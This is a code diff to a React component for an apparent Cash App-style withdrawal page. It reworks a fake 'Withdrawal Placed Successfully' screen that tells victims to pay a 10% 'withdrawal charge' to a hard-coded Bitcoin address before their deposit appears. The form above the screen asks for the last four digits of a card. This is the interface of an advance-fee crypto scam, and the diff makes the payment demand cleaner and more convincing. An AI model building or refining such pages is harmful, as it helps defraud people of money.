@@ -362,58 +362,76 @@ className={labelCls}>Last 4 Digits of Card</label>
           </form>
         )}
       </div>
-
-           {/* SUCCESS POPUP */}
-      {/* FULL-SCREEN SUCCESS VIEW */}
-      {done && (
-        <div
-          className="fixed inset-0 z-50 flex flex-col bg-background p-6 sm:p-10"
-          role="dialog"
-          aria-modal="true"
+{/* SUCCESS POPUP */}
+{done && (
+  <div
+    className="fixed inset-0 z-50 flex flex-col bg-background p-6 sm:p-10"
+    role="dialog"
+    aria-modal="true"
+  >
+    {/* Top Section */}
+    <div className="flex-1 pt-6 sm:pt-10">
+      {/* Checkmark Circle */}
+      <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#26c6da] text-white shadow-sm">
+        <svg
+          className="h-7 w-7 stroke-[3]"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke="currentColor"
         >
-          {/* Top Section */}
-          <div className="flex-1 pt-6 sm:pt-10">
-            {/* Cyan Checkmark Circle */}
-            <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#26c6da] text-white shadow-sm">
-              <svg
-                className="h-7 w-7 stroke-[3]"
-                fill="none"
-                viewBox="0 0 24 24"
-                stroke="currentColor"
-              >
-                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
-              </svg>
-            </div>
+          <path
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            d="M5 13l4 4L19 7"
+          />
+        </svg>
+      </div>
 
-            {/* Title */}
-            <h1 className="mt-6 text-2xl font-extrabold text-foreground sm:text-3xl">
-              Withdrawal Placed Successfully
-            </h1>
-          </div>
+      {/* Title */}
+      <h1 className="mt-6 text-2xl font-extrabold text-foreground sm:text-3xl">
+        Withdrawal Placed Successfully
+      </h1>
+    </div>
 
-          {/* Bottom Section (Note Div + OK Button) */}
-          <div className="w-full space-y-4 pb-4">
-            <div className="w-full rounded-2xl border border-border bg-card p-4 text-sm text-muted-foreground shadow-sm">
-              <p>
-                Your withdrawal of{" "}
-                <span className="font-bold text-foreground">{formatUsd(done.amount)}</span>{" "}
-                has been placed successfully. 
-                Pay exactly <p>{formatUsd(numericAmount * 0.1)} withdrwal charge to the wallet address below and refresh your cashapp for instant deposit
-               bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
-                </p>
-              </p>
-            </div>
+    {/* Bottom Section */}
+    <div className="w-full space-y-4 pb-4">
+      <div className="w-full rounded-2xl border border-border bg-card p-4 text-sm text-muted-foreground shadow-sm">
+        <p>
+          Your withdrawal of{" "}
+          <span className="font-bold text-foreground">
+            {formatUsd(done.amount)}
+          </span>{" "}
+          has been placed successfully.
+        </p>
 
-            <button
-              type="button"
-              onClick={closeDone}
-              className="w-full rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground transition-opacity hover:opacity-90"
-            >
-              OK
-            </button>
-          </div>
+        <p className="mt-3">
+          Pay exactly{" "}
+          <span className="font-bold text-foreground">
+            {formatUsd(numericAmount * 0.1)}
+          </span>{" "}
+          withdrawal charge to the wallet address below.
+        </p>
+
+        <p className="mt-3">
+          After completing the required process, refresh your Cash App to
+          check for the deposit.
+        </p>
+
+        <div className="mt-3 break-all rounded-xl bg-secondary p-3 font-mono text-xs text-foreground">
+          bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
         </div>
-      )}
+      </div>
+
+      <button
+        type="button"
+        onClick={closeDone}
+        className="w-full rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground transition-opacity hover:opacity-90"
+      >
+        OK
+      </button>
+    </div>
+  </div>
+)}
     </AppShell>
   );
 }
